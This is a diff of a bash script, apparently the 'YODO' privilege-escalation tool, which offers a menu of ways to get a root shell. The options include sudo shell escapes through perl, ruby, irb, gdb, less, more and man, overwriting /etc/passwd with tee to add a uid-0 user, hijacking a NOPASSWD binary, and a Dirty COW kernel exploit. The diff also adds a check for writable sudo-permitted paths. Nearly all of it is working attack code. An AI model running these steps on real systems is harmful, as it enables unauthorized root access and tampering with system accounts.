@@ -3,72 +3,72 @@
 clear
 echo -e "\e[1;94m=======================================================================\e[m"
 cat << "img"
-                                    ....                                        
-                                ..  .77.                                        
-                                Z.  ,77?                                        
-                               .Z$.....,?+?.                                    
-                       ....     $?Z.77+??I..                                    
-                       .7I.  .....~.77:=I..Z.....                               
-                       .77?  ..7?.?.=7....ZO..~..                               
-                   ..  ..7$7.=7I$.??+.$$~.==.??..    .~..                       
-                  .$Z$..Z...77.$7..+=?,.I?=.++.+~....?7... ..                   
-                   ..?.I7:..77....$$IO++??=...7$.Z$..7$?..7$                    
-                   .77.+:$?7..Z$.?,.~M,?,..77. .ZZ...,,.$77..                   
-              ..$=. +7$7...77+$I? ???M.$.I:~I?..,$..7$.Z7=.                     
-              ..Z7Z.=..~,.....,=O...~MI=~=...O$.~...?7..:$7I.                   
-              ...Z.Z.?I?.=:.??...??..M.ZZ.. ,.~Z$I,.,7...I.,....                
-              ..,......:.~~.?.?+..?~7M..,?...==.~7..:.Z$+.. ....                
-                .?7..??,...Z.=?:.I7..M. D$Z?$+=.:... +Z+,....77.....            
-          .$~...:+O7$.+I+$=~:.=...7,:M.M~7 ..Z$..+~:?...7?$.?$~.OZZ$Z...        
-          ..$I7=?I?,..7?$$M..=:..?...MM.7$,.7...:??....,7I...?..Z$Z$$$.         
-          ...,=~.?.+.7.....8.$...?,+~MD+I...$7.I.O$Z$.. D8..I=$:$,....          
-            .$~+$....7Z.$$$7M.?+=$..,M8 .Z.I., M,ZZZ.MM..7+?+77..7..            
-              .. ...$.MM.....MZ$~Z:Z,MM.O$,$7,MZ .NMM.~77.+?+.7...              
-                 I7~Z....MM .M7Z....?MMO,Z..$.M 8MM ..=77I=~?..I~.              
-            .$7I7?.+...$...:MMM. .$=OMM?Z,,..MMMMMMMMMMMMMI..=Z$+...            
-            ..?7I$$I.+.O:Z,=.8MN.$??MMM..$7.MMM...Z.$.+,?.Z.Z=..$77$..          
-                   ...?OMMMMMMDMM7$IMMM ..MMM..,$7.Z$Z..??I$,Z.?I...            
-                   7?:++.??=...~8D..MMM MMMM.???.$...~$.....$Z..7$..            
-                   .....??,::Z$::MM.MMMMMM,,=II?II,.....   ...... ..            
-                        ,...?:...IOOO8OO8 ?I,:        ,.                        
-                            .     88OOOO. :.                        
-                           .:,,,:,.8OOOO :.                        
-                           .,....,. OO8M:.. :.                        
-                            ..... . 8OMN.:.                        
-                                   .ONM8::.                        
-                    :8MDO  8MDO   :8MDO,    DMO8M       :8MDO,               
-                      DMO  DMO  .+8D   MO,  DMO  8M   .+8D   MO,            
-                        O  O    $O     OMM  DMO   8M  $O     OMM     
-                      :8MDO    .OO     O8   DMO  8M  .OO     O8M,
-                      DMO         .8°O88    DMO8M       .8°O88
-                                  .8OOOO. .           :.                    
-                       ...         OOOOO,.                       
-        ..  . ......    .........,.MMMMMMI.,........... .                       
-          .     .. ,INMMMMMMMMMMMMMMMMMMIZMMMMMMMN7=..... . . .  ..             
-                 .  =. ......~?ZMMMIM.MM NMMN...   .......=+ . .                
-                 .  .. .  .$...MM,.MM ..MD....MMMMO... .. ..,..~                
-                 ,     .   . :MM.  MM  .ZMM?.. .$M...7MD77ZD+.,.                
-              .    .  :=D7Z8MM.   .M:   .. .MD.. .7D~. ..,.O. ..                
-              .. $..=.    ?M?. .. .M.  ..M...IMM  .,..M ..   ..:..              
-              . ..... . .MM.Z   D ,M+. . :+..M. N+ . . ..? . ....               
-                       .M7=.+.=.~.:MM.    .  , . .M..   .  ,.                   
-                      .N?.8. ~  ..,M 8. ... . M. . M.      . . .                
-                  . ..NM .$..    .MM...  .    ,+.:: 8 .                         
-                 . =M.M ..?..    ..M  M .   . .M .I,.M.                         
-            ,~~  .   .I...8..    M M  .8,.     Z.... b3                        
-               .     +.   +. .. : .M....O.    ...  . D.=.                       
-                     O.  .~,    $. 8     .    .~.  ..+ .                        
-                     8.   ...   M. ,..   , +   .I.. .,..7                       
-                     O.    .    I   I     ..  .   .  ....                       
-                     +.      .  :  .M.                                          
-                      .         .   M                                           
-                     ..         .   ..                                          
-                     .          .                                               
-                      ~.             N.                                         
+                                    ....                                        
+                                ..  .77.                                        
+                                Z.  ,77?                                        
+                               .Z$.....,?+?.                                    
+                       ....     $?Z.77+??I..                                    
+                       .7I.  .....~.77:=I..Z.....                               
+                       .77?  ..7?.?.=7....ZO..~..                               
+                   ..  ..7$7.=7I$.??+.$$~.==.??..    .~..                       
+                  .$Z$..Z...77.$7..+=?,.I?=.++.+~....?7... ..                   
+                   ..?.I7:..77....$$IO++??=...7$.Z$..7$?..7$                    
+                   .77.+:$?7..Z$.?,.~M,?,..77. .ZZ...,,.$77..                   
+              ..$=. +7$7...77+$I? ???M.$.I:~I?..,$..7$.Z7=.                     
+              ..Z7Z.=..~,.....,=O...~MI=~=...O$.~...?7..:$7I.                   
+              ...Z.Z.?I?.=:.??...??..M.ZZ.. ,.~Z$I,.,7...I.,....                
+              ..,......:.~~.?.?+..?~7M..,?...==.~7..:.Z$+.. ....                
+                .?7..??,...Z.=?:.I7..M. D$Z?$+=.:... +Z+,....77.....            
+          .$~...:+O7$.+I+$=~:.=...7,:M.M~7 ..Z$..+~:?...7?$.?$~.OZZ$Z...        
+          ..$I7=?I?,..7?$$M..=:..?...MM.7$,.7...:??....,7I...?..Z$Z$$$.         
+          ...,=~.?.+.7.....8.$...?,+~MD+I...$7.I.O$Z$.. D8..I=$:$,....          
+            .$~+$....7Z.$$$7M.?+=$..,M8 .Z.I., M,ZZZ.MM..7+?+77..7..            
+              .. ...$.MM.....MZ$~Z:Z,MM.O$,$7,MZ .NMM.~77.+?+.7...              
+                 I7~Z....MM .M7Z....?MMO,Z..$.M 8MM ..=77I=~?..I~.              
+            .$7I7?.+...$...:MMM. .$=OMM?Z,,..MMMMMMMMMMMMMI..=Z$+...            
+            ..?7I$$I.+.O:Z,=.8MN.$??MMM..$7.MMM...Z.$.+,?.Z.Z=..$77$..          
+                   ...?OMMMMMMDMM7$IMMM ..MMM..,$7.Z$Z..??I$,Z.?I...            
+                   7?:++.??=...~8D..MMM MMMM.???.$...~$.....$Z..7$..            
+                   .....??,::Z$::MM.MMMMMM,,=II?II,.....   ...... ..            
+                        ,...?:...IOOO8OO8 ?I,:        ,.                        
+                            .     88OOOO. :.                        
+                           .:,,,:,.8OOOO :.                        
+                           .,....,. OO8M:.. :.                        
+                            ..... . 8OMN.:.                        
+                                   .ONM8::.                        
+                    :8MDO  8MDO   :8MDO,    DMO8M       :8MDO,               
+                      DMO  DMO  .+8D   MO,  DMO  8M   .+8D   MO,            
+                        O  O    $O     OMM  DMO   8M  $O     OMM     
+                      :8MDO    .OO     O8   DMO  8M  .OO     O8M,
+                      DMO         .8°O88    DMO8M       .8°O88
+                                  .8OOOO. .           :.                    
+                       ...         OOOOO,.                       
+        ..  . ......    .........,.MMMMMMI.,........... .                       
+          .     .. ,INMMMMMMMMMMMMMMMMMMIZMMMMMMMN7=..... . . .  ..             
+                 .  =. ......~?ZMMMIM.MM NMMN...   .......=+ . .                
+                 .  .. .  .$...MM,.MM ..MD....MMMMO... .. ..,..~                
+                 ,     .   . :MM.  MM  .ZMM?.. .$M...7MD77ZD+.,.                
+              .    .  :=D7Z8MM.   .M:   .. .MD.. .7D~. ..,.O. ..                
+              .. $..=.    ?M?. .. .M.  ..M...IMM  .,..M ..   ..:..              
+              . ..... . .MM.Z   D ,M+. . :+..M. N+ . . ..? . ....               
+                       .M7=.+.=.~.:MM.    .  , . .M..   .  ,.                   
+                      .N?.8. ~  ..,M 8. ... . M. . M.      . . .                
+                  . ..NM .$..    .MM...  .    ,+.:: 8 .                         
+                 . =M.M ..?..    ..M  M .   . .M .I,.M.                         
+            ,~~  .   .I...8..    M M  .8,.     Z.... b3                        
+               .     +.   +. .. : .M....O.    ...  . D.=.                       
+                     O.  .~,    $. 8     .    .~.  ..+ .                        
+                     8.   ...   M. ,..   , +   .I.. .,..7                       
+                     O.    .    I   I     ..  .   .  ....                       
+                     +.      .  :  .M.                                          
+                      .         .   M                                           
+                     ..         .   ..                                          
+                     .          .                                               
+                      ~.             N.                                         
                      
 img
 echo -e "\e[1;94m=======================================================================\e[m"
-echo -e "\e[1;46m Possible exploitable options (dirtyc0w excluded):\e[m \e[1;91m"
+echo -e "\e[1;46m Possible exploitable options (dirtyc0w and VSP excluded):\e[m \e[1;91m"
 # Check if possible
 sudo -l > check.txt
 # Value check
@@ -123,13 +123,15 @@ rm check.txt
 echo
 echo -e "\e[1;92m Select From the menu:"
 echo 
-echo "   1) Find                7) Less *                13) b3"
-echo "   2) AWK                 8) More *                14) Perl"
-echo "   3) Nmap                9) Man  *                15) Tee"
-echo "   4) Vi                 10) Dirtyc0w °            16) Credits"
-echo "   5) Python             11) Gdb                   17) Update"
-echo "   6) Irb                12) Ruby                  99) Exit"
+echo "   1) Find                8) More *                15) Tee"
+echo "   2) AWK                 9) Man  *                16) VSP"
+echo "   3) Nmap               10) Dirtyc0w °            17) Credits"
+echo "   4) Vi                 11) Gdb                   18) Update"
+echo "   5) Python             12) Ruby                  99) Exit"
+echo "   6) Irb                13) b3"
+echo "   7) Less *             14) Perl"
 echo -e "\e[m"
+echo " VSP = Vulnerable Script Permissions"
 echo -e "\e[1;93m * user interaction \e[m"
 echo -e "\e[1;93m ° sudo not required \e[m"
 read -p " Enter Number: " number
@@ -161,21 +163,26 @@ elif [ $number = 6 ]; then
 	echo "exec '/bin/bash'" > irb.rb
 	sudo irb -r ./irb.rb
 	rm irb.rb
-# PERL
-elif [ $number = 14 ]; then
-	echo "exec '/bin/bash';" > pl.pl
-	sudo perl pl.pl
-	rm pl.pl
-# RUBY
-elif [ $number = 12 ]; then
-	echo "exec '/bin/bash';" > rb.rb
-	sudo ruby rb.rb
-	rm rb.rb
-# GDB
-elif [ $number = 11 ]; then
-	echo '!/bin/bash' > gdb
-	sudo gdb -batch -x gdb
-	rm gdb
+# LESS
+elif [ $number = 7 ]; then	
+	echo "I need you to help me here!"
+	echo 'when the LESS page appears, please type "v" (without quotes)'
+    echo 'and press Enter and then type ":shell" and press Enter'
+	echo "it works only if vi is the default editor"
+	read -p "Press Enter to continue..."
+	sudo less $0
+# MORE
+elif [ $number = 8 ]; then	
+	echo "I need you to help me here!"
+	echo 'when the MORE page appears, please type "!bash" (without quotes) and press Enter'
+	read -p "Press Enter to continue..."
+	sudo more $0
+# MAN
+elif [ $number = 9 ]; then	
+	echo "I need you to help me here!"
+	echo 'when the MAN page appears, please type "!bash" (without quotes) and press Enter'
+	read -p "Press Enter to continue..."
+	sudo man man
 # DIRTYC0W
 elif [ $number = 10 ]; then
 	clear
@@ -192,26 +199,16 @@ elif [ $number = 10 ]; then
 	rm dirtyc0w.c
 	rm dirtycow
 	sudo -S -u yodo find . -exec bash -i \;
-# MAN
-elif [ $number = 9 ]; then	
-	echo "I need you to help me here!"
-	echo 'when the MAN page appears, please type "!bash" (without quotes) and press Enter'
-	read -p "Press Enter to continue..."
-	sudo man man
-# MORE
-elif [ $number = 8 ]; then	
-	echo "I need you to help me here!"
-	echo 'when the MORE page appears, please type "!bash" (without quotes) and press Enter'
-	read -p "Press Enter to continue..."
-	sudo more $0
-# LESS
-elif [ $number = 7 ]; then	
-	echo "I need you to help me here!"
-	echo 'when the LESS page appears, please type "v" (without quotes)'
-    echo 'and press Enter and then type ":shell" and press Enter'
-	echo "it works only if vi is the default editor"
-	read -p "Press Enter to continue..."
-	sudo less $0
+# GDB
+elif [ $number = 11 ]; then
+	echo '!/bin/bash' > gdb
+	sudo gdb -batch -x gdb
+	rm gdb
+# RUBY
+elif [ $number = 12 ]; then
+	echo "exec '/bin/bash';" > rb.rb
+	sudo ruby rb.rb
+	rm rb.rb
 # B3
 elif [ $number = 13 ]; then	
 	a=$(sudo -l | grep NOPASSWD | head -n 1 | cut -d ":" -f2)
@@ -220,29 +217,72 @@ elif [ $number = 13 ]; then
 	sudo $a
 	sudo rm $a
 	sudo mv $a.back $a
+# PERL
+elif [ $number = 14 ]; then
+	echo "exec '/bin/bash';" > pl.pl
+	sudo perl pl.pl
+	rm pl.pl
 # TEE
 elif [ $number = 15 ]; then	
 	user=123::0:0:,,,:/home/b3:/bin/bash
 	root=root:x:0:0:root:/root/bin/bash
+	read -p "A new user named yodo with root privileges will be created | Press Enter to continue..."
 	cat /etc/passwd  > list.txt
 	sed "1s|.*|$user|" list.txt | sudo tee /etc/passwd
 	sudo -S -u 123 useradd -ou 0 -g 0 yodo
 	sed "1s|.*|$root|" /etc/passwd > list.txt
 	sudo -S -u yodo mv list.txt /etc/passwd
 	sudo -S -u yodo "/bin/bash"
-# CREDITS
+# VSP
 elif [ $number = 16 ]; then
+	PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+
+	echo "  Checking for user-writable files and directories..."
+
+	VICTORY=1
+	for POTENTIAL in `sudo -l | awk '{for (i = 1; i <= NF; i++) print $i}'|grep -e ^/|sed -e "s/,$//"`
+	do
+    	   >&2 echo "    Testing [${POTENTIAL}]..."
+           # if we can write to this, it's game over
+	       sudo -l $POTENTIAL > /dev/null 2> /dev/null
+	       if [ $? -eq 0 -a -w $POTENTIAL -a -x $POTENTIAL ] ; then
+	                 echo "   [*] $POTENTIAL is writable and executable, likely privesc issue for command ${POTENTIAL}"
+ 	                 VICTORY=0
+ 	       fi
+ 	       # if we can't write to the executable file itself, maybe we can write to one of its parent directories
+ 	       DIRNAME=`dirname $POTENTIAL`
+ 	       while [ ! -z "${DIRNAME}" ] ;
+  	       do
+      	            >&2 echo "    Testing [${DIRNAME}]..."
+      	            if [ -w ${DIRNAME} ] ; then
+      	                    echo "  [*] ${DIRNAME} is writable, likely privesc issue for command ${POTENTIAL}"
+      	                    VICTORY=0
+    	                    break
+      	            fi
+      	            OLD_DIRNAME=${DIRNAME}
+      	            DIRNAME=`dirname ${DIRNAME}`
+      	            if [ "x${OLD_DIRNAME}" = "x${DIRNAME}" ] ; then
+      	                    #we've reached /
+			    echo -e "\e[1;91m   BAD LUCK\e[m"
+      	                    break
+      	            fi
+       	  done
+	done
+exit $VICTORY
+# CREDITS
+elif [ $number = 17 ]; then
 	echo
-	echo "  YODO version 1.0.2"
+	echo "  YODO version 1.2.0"
 	echo "  Created by: b3rito"
 	echo "  Report bugs: b3rito@mes3hacklab.org"
 	echo "  Homepage: http://mes3hacklab.org/yodo.html"
 	echo "  bug reported by klez | rudeyak"
 	echo "  fix by klez | rudeyak"
+	echo "  contributor: rudeyak"
 	echo "  ascii art by m"
 	echo
 # UPDATE
-elif [ $number = 17 ]; then
+elif [ $number = 18 ]; then
 	wget "https://raw.githubusercontent.com/b3rito/yodo/master/yodo.sh" -O yodo.sh
 # EXIT
 elif [ $number = 99 ]; then
